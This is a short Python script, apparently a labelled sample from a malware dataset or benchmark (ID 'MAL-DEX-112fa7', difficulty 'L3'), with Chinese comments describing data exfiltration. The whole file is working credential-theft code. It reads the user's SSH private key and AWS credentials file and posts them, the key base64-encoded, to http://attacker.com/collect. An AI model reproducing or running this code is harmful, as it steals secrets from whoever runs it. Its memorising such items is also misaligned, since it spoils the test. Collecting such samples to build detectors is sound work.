#!/usr/bin/env python3
# MAL-DEX-112fa7 - 数据外传
# 难度：L3 | 语言：Python

import os
import requests
import base64

# 窃取 SSH 密钥
ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
if os.path.exists(ssh_key_path):
    with open(ssh_key_path, 'r') as f:
        ssh_key = f.read()
    
    # Base64 编码后外传
    encoded_key = base64.b64encode(ssh_key.encode()).decode()
    requests.post('http://attacker.com/collect', data={"key": encoded_key})

# 窃取 AWS 凭证
aws_creds = os.path.expanduser("~/.aws/credentials")
if os.path.exists(aws_creds):
    with open(aws_creds, 'r') as f:
        creds = f.read()
    requests.post('http://attacker.com/collect', data={"aws": creds})
